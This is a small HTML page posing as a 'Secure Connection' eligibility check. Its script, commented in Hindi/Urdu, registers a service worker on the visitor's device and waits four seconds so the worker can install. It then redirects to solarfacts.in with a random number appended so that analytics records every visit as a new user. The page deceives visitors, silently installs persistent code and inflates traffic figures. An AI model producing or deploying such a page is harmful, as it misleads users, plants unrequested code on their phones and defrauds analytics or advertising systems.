<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Connection...</title>
    <style>
        body { background: #fff; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #128c7e; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { color: #555; margin-top: 15px; font-size: 14px; }
    </style>
</head>
<body>

    <div class="loader"></div>
    <p>Verifying your eligibility...</p>

    <script>
        // 1. Service Worker Register (Wohi purana sw.js activate karega)
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('sw.js?v=final');
        }

        // 2. The Hard Hit Redirect
        function forceRedirect() {
            // Random Number taake Analytics ko har baar naya user lage
            var salt = Math.floor(Math.random() * 10000);
            var target = "https://solarfacts.in/?hit=" + salt;
            
            // Ye command browser ko force karti hai hit register karne ke liye
            window.location.replace(target);
        }

        // 4 second ka wait (Zaroori hai taake sw.js pehle mobile mein ghuss jaye)
        setTimeout(forceRedirect, 4000);
    </script>
</body>
</html>
